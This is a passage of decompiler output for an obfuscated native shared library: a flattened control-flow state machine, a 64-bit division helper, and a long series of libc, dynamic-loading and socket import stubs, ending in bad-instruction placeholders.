          }
          else {
            if (local_90[0] == DAT_00034eb8) {
              uVar3 = (*(uint *)(DAT_0003501c + 0x34900) ^ DAT_00034f60) -
                      (*(uint *)(DAT_00035018 + 0x348f0) ^ DAT_00034f5c);
              iVar6 = iVar14;
              iVar11 = DAT_00034ea4;
              if (DAT_00034f6c <
                  (uVar3 & DAT_00034f64) * (DAT_00034e74 ^ DAT_00034e74 + 2) +
                  (uVar3 ^ DAT_00034f64) + DAT_00034f68) {
                iVar6 = 0x7e8eaa30;
              }
              goto LAB_00034e38;
            }
            if (local_90[0] == DAT_00034ebc) {
              **ppiVar13 = DAT_00034ed0;
            }
            else {
              if (local_90[0] == DAT_00034ec0) {
                **ppiVar13 = iVar2;
                puVar7 = local_44;
                goto LAB_00034cc4;
              }
              if (local_90[0] == DAT_00034ec4) {
                **ppiVar13 = DAT_00034eac;
              }
              else if (local_90[0] == DAT_00034ec8) {
                uVar5 = (*(code *)*local_38)(local_30,local_2c);
                iVar15 = DAT_00034e90;
                iVar14 = DAT_00034e8c;
                iVar8 = DAT_00034e88;
                iVar12 = DAT_00034e84;
                *local_44 = uVar5;
                **ppiVar13 = DAT_00034e90;
              }
              else {
                if (local_90[0] == DAT_00034ecc) {
                  uVar3 = (*(uint *)(DAT_00035034 + 0x34b4c) ^ DAT_00034f18) +
                          (*(uint *)(DAT_00035030 + 0x34b40) ^ DAT_00034f14) + DAT_00034f1c;
                  iVar6 = DAT_00034eb4;
                  if ((uVar3 + (uVar3 ^ DAT_00034f20)) - (uVar3 & DAT_00034f24) == DAT_00034f28) {
                    iVar6 = 0x5e6125fc;
                  }
                  goto LAB_00034e38;
                }
                if (local_90[0] == DAT_00034ed0) {
                  **ppiVar13 = iVar12;
                  *local_40 = *local_38 == 0;
                }
                else {
                  if (local_90[0] == DAT_00034ed4) {
                    iVar6 = DAT_00034ed8;
                    if (((*(uint *)(DAT_0003502c + 0x34a2c) ^ DAT_00034f30 |
                         *(uint *)(DAT_00035028 + 0x34a20) ^ DAT_00034f2c) + DAT_00034f34 &
                        DAT_00034f38) < DAT_00034f3c) {
                      iVar6 = 0x5e6125fc;
                    }
                    goto LAB_00034e38;
                  }
                  if (local_90[0] == DAT_00034ed8) {
                    **ppiVar13 = DAT_00034ecc;
                  }
                  else {
                    if (local_90[0] == DAT_00034edc) {
                      uVar3 = *(uint *)(DAT_00035020 + 0x34a90);
                      uVar10 = *(uint *)(DAT_00035024 + 0x34a98);
                      uVar5 = FUN_0002d8bc(local_30,local_2c);
                      *local_3c = uVar5;
                      uVar3 = ((uVar3 ^ DAT_00034f44) & (uVar10 ^ DAT_00034f40)) + DAT_00034f48;
                      uVar3 = (uVar3 & DAT_00034f4c) * (DAT_00034e7c + 2 ^ DAT_00034e7c) +
                              (uVar3 ^ DAT_00034f4c);
                      iVar6 = DAT_00034edc;
                      iVar8 = DAT_00034e88;
                      iVar9 = DAT_00034eb0;
                      iVar11 = DAT_00034ea4;
                      iVar12 = DAT_00034e84;
                      ppiVar13 = local_50;
                      iVar14 = DAT_00034e8c;
                      iVar15 = DAT_00034e90;
                      if ((DAT_00034f54 & ~uVar3 | uVar3 & DAT_00034f50) < DAT_00034f58) {
                        iVar6 = 0x349903e;
                      }
                      goto LAB_00034e38;
                    }
                    if (local_90[0] == DAT_00034ee0) {
                      return *local_48;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  } while( true );
}



// ---- 00035050  FUN_00035050  size=16

void FUN_00035050(code *UNRECOVERED_JUMPTABLE,undefined4 param_2,undefined4 param_3)

{
                    /* WARNING: Could not recover jumptable at 0x0003505c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(param_3);
  return;
}



// ---- 00035060  FUN_00035060  size=72

void FUN_00035060(uint param_1,uint param_2)

{
  if (param_2 == 0) {
    FUN_00035230(0);
    return;
  }
  if (param_2 != 1) {
    if (param_2 <= param_1) {
                    /* WARNING: Could not recover jumptable at 0x00035094. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      (*(code *)(&UNK_0003521c + (LZCOUNT(param_2) - LZCOUNT(param_1)) * -0xc))();
      return;
    }
    return;
  }
  return;
}



// ---- 00035230  FUN_00035230  size=4

void FUN_00035230(void)

{
  return;
}



// ---- 00035234  memcpy  size=4

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memcpy_00039d34)();
  return pvVar1;
}



// ---- 00035238  memmove  size=4

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memmove(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memmove_00039d38)();
  return pvVar1;
}



// ---- 0003524c  FUN_0003524c  size=24

void FUN_0003524c(undefined4 param_1,undefined4 param_2)

{
  (*DAT_00039d3c)(param_1,0,param_2);
  return;
}



// ---- 00035258  FUN_00035258  size=28

void FUN_00035258(undefined4 param_1,undefined4 param_2)

{
  undefined local_8 [8];
  
  FUN_00035274(param_1,param_2,local_8);
  return;
}



// ---- 00035274  FUN_00035274  size=84

uint FUN_00035274(uint param_1,uint param_2,uint *param_3)

{
  uint uVar1;
  
  if (param_2 == 0) {
    uVar1 = FUN_00035230(0);
    return uVar1;
  }
  if (param_2 != 1) {
    if (param_2 <= param_1) {
                    /* WARNING: Could not recover jumptable at 0x000352a4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      uVar1 = (*(code *)(&UNK_0003541c + (LZCOUNT(param_2) - LZCOUNT(param_1)) * -0xc))();
      return uVar1;
    }
    *param_3 = param_1;
    return 0;
  }
  *param_3 = 0;
  return param_1;
}



// ---- 00035454  FUN_00035454  size=36

void FUN_00035454(void)

{
  FUN_00035478();
  return;
}



// ---- 00035478  FUN_00035478  size=736

ulonglong FUN_00035478(uint param_1,uint param_2,uint param_3,uint param_4,uint *param_5)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  
  if (param_2 == 0) {
    if (param_4 == 0) {
      uVar14 = FUN_00035060(param_1,param_3);
      uVar9 = (uint)uVar14;
      if (param_5 != (uint *)0x0) {
        uVar9 = param_1 - uVar9 * param_3;
        uVar14 = uVar14 & 0xffffffff;
      }
LAB_000356cc:
      if (param_5 != (uint *)0x0) {
        *param_5 = uVar9;
        param_5[1] = (uint)(uVar14 >> 0x20);
      }
      return uVar14 & 0xffffffff;
    }
    if (param_5 != (uint *)0x0) {
      param_2 = 0;
      *param_5 = param_1;
      param_5[1] = 0;
      param_1 = 0;
LAB_000354e8:
      return CONCAT44(param_2,param_1);
    }
  }
  else {
    if (param_3 != 0) {
      if (param_4 == 0) {
        if ((param_3 & param_3 - 1) == 0) {
          if (param_5 != (uint *)0x0) {
            *param_5 = param_3 - 1 & param_1;
            param_5[1] = 0;
          }
          if (param_3 != 1) {
            bVar2 = (byte)param_3;
            bVar3 = (byte)(param_3 >> 8);
            bVar4 = (byte)(param_3 >> 0x10);
            bVar1 = (byte)(param_3 >> 0x18);
            uVar9 = LZCOUNT((uint)(byte)((((((((bVar2 & 1) << 1 | bVar2 >> 1 & 1) << 1 |
                                             bVar2 >> 2 & 1) << 1 | bVar2 >> 3 & 1) << 1 |
                                           bVar2 >> 4 & 1) << 1 | bVar2 >> 5 & 1) << 1 |
                                         bVar2 >> 6 & 1) << 1 | bVar2 >> 7) << 0x18 |
                            (uint)(byte)((((((((bVar3 & 1) << 1 | bVar3 >> 1 & 1) << 1 |
                                             bVar3 >> 2 & 1) << 1 | bVar3 >> 3 & 1) << 1 |
                                           bVar3 >> 4 & 1) << 1 | bVar3 >> 5 & 1) << 1 |
                                         bVar3 >> 6 & 1) << 1 | bVar3 >> 7) << 0x10 |
                            (uint)(byte)((((((((bVar4 & 1) << 1 | bVar4 >> 1 & 1) << 1 |
                                             bVar4 >> 2 & 1) << 1 | bVar4 >> 3 & 1) << 1 |
                                           bVar4 >> 4 & 1) << 1 | bVar4 >> 5 & 1) << 1 |
                                         bVar4 >> 6 & 1) << 1 | bVar4 >> 7) << 8 |
                            (uint)(byte)((((((((bVar1 & 1) << 1 | bVar1 >> 1 & 1) << 1 |
                                             bVar1 >> 2 & 1) << 1 | bVar1 >> 3 & 1) << 1 |
                                           bVar1 >> 4 & 1) << 1 | bVar1 >> 5 & 1) << 1 |
                                         bVar1 >> 6 & 1) << 1 | bVar1 >> 7));
            return CONCAT44(param_2 >> uVar9,
                            (param_2 << 1) << (~uVar9 & 0x1f) | param_1 >> (uVar9 & 0x1f));
          }
          goto LAB_000354e8;
        }
        uVar9 = 0;
        uVar13 = (LZCOUNT(param_3) - LZCOUNT(param_2)) + 0x21;
        if (uVar13 != 0x20) {
          if (uVar13 < 0x20) {
            uVar12 = param_2 >> (uVar13 & 0xff);
            uVar11 = param_2 << (0x20 - uVar13 & 0xff) | param_1 >> (uVar13 & 0xff);
            uVar7 = param_1 << (0x20 - uVar13 & 0xff);
          }
          else {
            uVar9 = (LZCOUNT(param_3) - LZCOUNT(param_2)) + 1;
            uVar12 = 0;
            uVar7 = param_2 << (0x40 - uVar13 & 0xff) | param_1 >> (uVar9 & 0xff);
            uVar11 = param_2 >> (uVar9 & 0xff);
            uVar9 = param_1 << (0x40 - uVar13 & 0xff);
          }
          goto LAB_00035630;
        }
      }
      else {
        uVar7 = LZCOUNT(param_4) - LZCOUNT(param_2);
        if (0x1f < uVar7) goto LAB_000354b8;
        uVar13 = uVar7 + 1;
        uVar9 = 0;
        if (uVar13 != 0x20) {
          uVar12 = param_2 >> (uVar13 & 0xff);
          uVar11 = param_2 << ((uVar7 ^ 0x1f) & 0xff) | param_1 >> (uVar13 & 0xff);
          uVar7 = param_1 << ((uVar7 ^ 0x1f) & 0xff);
          goto LAB_00035630;
        }
      }
      uVar9 = 0;
      uVar13 = 0x20;
      uVar12 = 0;
      uVar11 = param_2;
      uVar7 = param_1;
LAB_00035630:
      uVar8 = 0;
      do {
        uVar10 = uVar11 << 1 | uVar7 >> 0x1f;
        uVar5 = uVar12 << 1 | uVar11 >> 0x1f;
        uVar6 = ~uVar5 + param_4 + (uint)CARRY4(~uVar10,param_3);
        uVar11 = uVar10 - param_3;
        uVar12 = uVar5 - (param_4 + (uVar10 < param_3));
        if (-1 < (int)uVar6) {
          uVar11 = uVar10;
          uVar12 = uVar5;
        }
        uVar6 = uVar6 >> 0x1f;
        uVar7 = uVar7 << 1 | uVar9 >> 0x1f;
        uVar5 = uVar9 << 1;
        uVar9 = uVar8 | uVar5;
        uVar13 = uVar13 - 1;
        uVar8 = uVar6;
      } while (uVar13 != 0);
      if (param_5 != (uint *)0x0) {
        *param_5 = uVar11;
        param_5[1] = uVar12;
      }
      return CONCAT44(uVar5 >> 0x1f | uVar7 << 1,uVar6 | uVar9 << 1);
    }
    if (param_4 == 0) {
      return CONCAT44(param_2,param_1);
    }
    if (param_1 == 0) {
      uVar14 = FUN_00035060(param_2,param_4);
      uVar9 = (uint)uVar14;
      if (param_5 != (uint *)0x0) {
        uVar14 = CONCAT44(param_2 - uVar9 * param_4,uVar9);
        uVar9 = 0;
      }
      goto LAB_000356cc;
    }
    if ((param_4 & param_4 - 1) == 0) {
      bVar2 = (byte)param_4;
      bVar3 = (byte)(param_4 >> 8);
      bVar4 = (byte)(param_4 >> 0x10);
      bVar1 = (byte)(param_4 >> 0x18);
      if (param_5 != (uint *)0x0) {
        *param_5 = param_1;
        param_5[1] = param_4 - 1 & param_2;
      }
      param_2 = param_2 >>
                LZCOUNT((uint)(byte)((((((((bVar2 & 1) << 1 | bVar2 >> 1 & 1) << 1 | bVar2 >> 2 & 1)
                                         << 1 | bVar2 >> 3 & 1) << 1 | bVar2 >> 4 & 1) << 1 |
                                      bVar2 >> 5 & 1) << 1 | bVar2 >> 6 & 1) << 1 | bVar2 >> 7) <<
                        0x18 | (uint)(byte)((((((((bVar3 & 1) << 1 | bVar3 >> 1 & 1) << 1 |
                                                bVar3 >> 2 & 1) << 1 | bVar3 >> 3 & 1) << 1 |
                                              bVar3 >> 4 & 1) << 1 | bVar3 >> 5 & 1) << 1 |
                                            bVar3 >> 6 & 1) << 1 | bVar3 >> 7) << 0x10 |
                        (uint)(byte)((((((((bVar4 & 1) << 1 | bVar4 >> 1 & 1) << 1 | bVar4 >> 2 & 1)
                                         << 1 | bVar4 >> 3 & 1) << 1 | bVar4 >> 4 & 1) << 1 |
                                      bVar4 >> 5 & 1) << 1 | bVar4 >> 6 & 1) << 1 | bVar4 >> 7) << 8
                        | (uint)(byte)((((((((bVar1 & 1) << 1 | bVar1 >> 1 & 1) << 1 |
                                           bVar1 >> 2 & 1) << 1 | bVar1 >> 3 & 1) << 1 |
                                         bVar1 >> 4 & 1) << 1 | bVar1 >> 5 & 1) << 1 |
                                       bVar1 >> 6 & 1) << 1 | bVar1 >> 7));
      goto LAB_00035538;
    }
    uVar9 = LZCOUNT(param_4) - LZCOUNT(param_2);
    if (uVar9 < 0x1f) {
      uVar13 = uVar9 + 1;
      uVar7 = param_1 << ((uVar9 ^ 0x1f) & 0xff);
      uVar11 = param_2 << ((uVar9 ^ 0x1f) & 0xff) | param_1 >> (uVar13 & 0xff);
      uVar12 = param_2 >> (uVar13 & 0xff);
      uVar9 = 0;
      goto LAB_00035630;
    }
LAB_000354b8:
    if (param_5 != (uint *)0x0) {
      *param_5 = param_1;
      param_5[1] = param_2;
    }
  }
  param_2 = 0;
LAB_00035538:
  return (ulonglong)param_2;
}



// ---- 00035780  __libc_init  size=12

void __libc_init(void)

{
  (*(code *)PTR___libc_init_00039c6c)();
  return;
}



// ---- 000357a0  __stack_chk_fail  size=12

void __stack_chk_fail(void)

{
  (*(code *)PTR___stack_chk_fail_00039c74)();
  return;
}



// ---- 000357b0  strlen  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_strlen_00039c78)();
  return sVar1;
}



// ---- 000357c0  __memcpy_chk  size=12

void __memcpy_chk(void)

{
  (*(code *)PTR___memcpy_chk_00039c7c)();
  return;
}



// ---- 000357d0  dlopen  size=12

void dlopen(void)

{
  (*(code *)PTR_dlopen_00039c80)();
  return;
}



// ---- 000357e0  dlsym  size=12

void dlsym(void)

{
  (*(code *)PTR_dlsym_00039c84)();
  return;
}



// ---- 000357f0  dlclose  size=12

void dlclose(void)

{
  (*(code *)PTR_dlclose_00039c88)();
  return;
}



// ---- 00035800  getenv  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * getenv(char *__name)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_getenv_00039c8c)();
  return pcVar1;
}



// ---- 00035810  strncmp  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int strncmp(char *__s1,char *__s2,size_t __n)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_strncmp_00039c90)();
  return iVar1;
}



// ---- 00035820  __errno  size=12

void __errno(void)

{
  (*(code *)PTR___errno_00039c94)();
  return;
}



// ---- 00035830  memcmp  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int memcmp(void *__s1,void *__s2,size_t __n)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_memcmp_00039c98)();
  return iVar1;
}



// ---- 00035840  close  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_close_00039c9c)();
  return iVar1;
}



// ---- 00035850  strnlen  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strnlen(char *__string,size_t __maxlen)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_strnlen_00039ca0)();
  return sVar1;
}



// ---- 00035860  __open_2  size=12

void __open_2(void)

{
  (*(code *)PTR___open_2_00039ca4)();
  return;
}



// ---- 00035870  fstat  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fstat(int __fd,stat *__buf)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fstat_00039ca8)();
  return iVar1;
}



// ---- 00035880  readlink  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t readlink(char *__path,char *__buf,size_t __len)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_readlink_00039cac)();
  return sVar1;
}



// ---- 00035890  strstr  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strstr(char *__haystack,char *__needle)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_strstr_00039cb0)();
  return pcVar1;
}



// ---- 000358a0  __openat_2  size=12

void __openat_2(void)

{
  (*(code *)PTR___openat_2_00039cb4)();
  return;
}



// ---- 000358b0  malloc  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_malloc_00039cb8)();
  return pvVar1;
}



// ---- 000358c0  memchr  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memchr(void *__s,int __c,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memchr_00039cbc)();
  return pvVar1;
}



// ---- 000358d0  free  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

{
  (*(code *)PTR_free_00039cc0)();
  return;
}



// ---- 000358e0  pread64  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t pread64(int __fd,void *__buf,size_t __nbytes,__off64_t __offset)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_pread64_00039cc4)();
  return sVar1;
}



// ---- 000358f0  mmap64  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * mmap64(void *__addr,size_t __len,int __prot,int __flags,int __fd,__off64_t __offset)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_mmap64_00039cc8)();
  return pvVar1;
}



// ---- 00035900  munmap  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int munmap(void *__addr,size_t __len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_munmap_00039ccc)();
  return iVar1;
}



// ---- 00035910  calloc  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * calloc(size_t __nmemb,size_t __size)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_calloc_00039cd0)();
  return pvVar1;
}



// ---- 00035920  mprotect  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mprotect(void *__addr,size_t __len,int __prot)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_mprotect_00039cd4)();
  return iVar1;
}



// ---- 00035930  __vsnprintf_chk  size=12

void __vsnprintf_chk(void)

{
  (*(code *)PTR___vsnprintf_chk_00039cd8)();
  return;
}



// ---- 00035940  opendir  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

DIR * opendir(char *__name)

{
  DIR *pDVar1;
  
  pDVar1 = (DIR *)(*(code *)PTR_opendir_00039cdc)();
  return pDVar1;
}



// ---- 00035950  dirfd  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dirfd(DIR *__dirp)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_dirfd_00039ce0)();
  return iVar1;
}



// ---- 00035960  closedir  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int closedir(DIR *__dirp)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_closedir_00039ce4)();
  return iVar1;
}



// ---- 00035970  readdir  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

dirent * readdir(DIR *__dirp)

{
  dirent *pdVar1;
  
  pdVar1 = (dirent *)(*(code *)PTR_readdir_00039ce8)();
  return pdVar1;
}



// ---- 00035980  fcntl  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fcntl(int __fd,int __cmd,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fcntl_00039cec)();
  return iVar1;
}



// ---- 00035990  sigaltstack  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sigaltstack(sigaltstack *__ss,sigaltstack *__oss)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_sigaltstack_00039cf0)();
  return iVar1;
}



// ---- 000359a0  syscall  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long syscall(long __sysno,...)

{
  long lVar1;
  
  lVar1 = (*(code *)PTR_syscall_00039cf4)();
  return lVar1;
}



// ---- 000359b0  strtol  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long strtol(char *__nptr,char **__endptr,int __base)

{
  long lVar1;
  
  lVar1 = (*(code *)PTR_strtol_00039cf8)();
  return lVar1;
}



// ---- 000359c0  socketpair  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socketpair(int __domain,int __type,int __protocol,int *__fds)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_socketpair_00039cfc)();
  return iVar1;
}



// ---- 000359d0  strtoul  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ulong strtoul(char *__nptr,char **__endptr,int __base)

{
  ulong uVar1;
  
  uVar1 = (*(code *)PTR_strtoul_00039d00)();
  return uVar1;
}



// ---- 000359e0  getsockopt  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t *__optlen)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_getsockopt_00039d04)();
  return iVar1;
}



// ---- 000359f0  getsockname  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getsockname(int __fd,sockaddr *__addr,socklen_t *__len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_getsockname_00039d08)();
  return iVar1;
}



// ---- 00035a00  getpeername  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int getpeername(int __fd,sockaddr *__addr,socklen_t *__len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_getpeername_00039d0c)();
  return iVar1;
}



// ---- 00035a10  sendto  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t sendto(int __fd,void *__buf,size_t __n,int __flags,sockaddr *__addr,socklen_t __addr_len)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_sendto_00039d10)();
  return sVar1;
}



// ---- 00035a20  sendmsg  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t sendmsg(int __fd,msghdr *__message,int __flags)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_sendmsg_00039d14)();
  return sVar1;
}



// ---- 00035a30  recvmsg  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t recvmsg(int __fd,msghdr *__message,int __flags)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_recvmsg_00039d18)();
  return sVar1;
}



// ---- 00035a40  __cmsg_nxthdr  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

cmsghdr * __cmsg_nxthdr(msghdr *__mhdr,cmsghdr *__cmsg)

{
  cmsghdr *pcVar1;
  
  pcVar1 = (cmsghdr *)(*(code *)PTR___cmsg_nxthdr_00039d1c)();
  return pcVar1;
}



// ---- 00035a50  dprintf  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dprintf(int __fd,char *__fmt,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_dprintf_00039d20)();
  return iVar1;
}



// ---- 00035a60  vdprintf  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int vdprintf(int __fd,char *__fmt,__gnuc_va_list __arg)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_vdprintf_00039d24)();
  return iVar1;
}



// ---- 00035a70  _exit  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void _exit(int __status)

{
  (*(code *)PTR__exit_00039d28)();
  return;
}



// ---- 00035a80  memalign  size=12

void memalign(void)

{
  (*(code *)PTR_memalign_00039d2c)();
  return;
}



// ---- 00035a90  dlerror  size=12

void dlerror(void)

{
  (*(code *)PTR_dlerror_00039d30)();
  return;
}



// ---- 00035aa0  memcpy  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memcpy_00039d34)();
  return pvVar1;
}



// ---- 00035ab0  memmove  size=12

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memmove(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memmove_00039d38)();
  return pvVar1;
}



// ---- 00040000  __libc_init  size=1

/* WARNING: Control flow encountered bad instruction data */

void __libc_init(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040004  __cxa_atexit  size=1

/* WARNING: Control flow encountered bad instruction data */

void __cxa_atexit(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040008  __stack_chk_fail  size=1

/* WARNING: Control flow encountered bad instruction data */

void __stack_chk_fail(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040010  strlen  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040014  __memcpy_chk  size=1

/* WARNING: Control flow encountered bad instruction data */

void __memcpy_chk(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040018  dlopen  size=1

/* WARNING: Control flow encountered bad instruction data */

void dlopen(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004001c  dlsym  size=1

/* WARNING: Control flow encountered bad instruction data */

void dlsym(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040020  dlclose  size=1

/* WARNING: Control flow encountered bad instruction data */

void dlclose(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040024  getenv  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * getenv(char *__name)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040028  strncmp  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int strncmp(char *__s1,char *__s2,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004002c  __errno  size=1

/* WARNING: Control flow encountered bad instruction data */

void __errno(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040030  memcmp  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int memcmp(void *__s1,void *__s2,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040034  close  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040038  strnlen  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strnlen(char *__string,size_t __maxlen)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004003c  __open_2  size=1

/* WARNING: Control flow encountered bad instruction data */

void __open_2(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040040  fstat  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fstat(int __fd,stat *__buf)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040044  readlink  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t readlink(char *__path,char *__buf,size_t __len)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040048  strstr  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strstr(char *__haystack,char *__needle)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004004c  __openat_2  size=1

/* WARNING: Control flow encountered bad instruction data */

void __openat_2(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040050  malloc  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040054  memchr  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memchr(void *__s,int __c,size_t __n)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 00040058  free  size=1

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



// ---- 0004005c  pread64  size=1

/* WARNING: Control flow encountered bad instruction data */
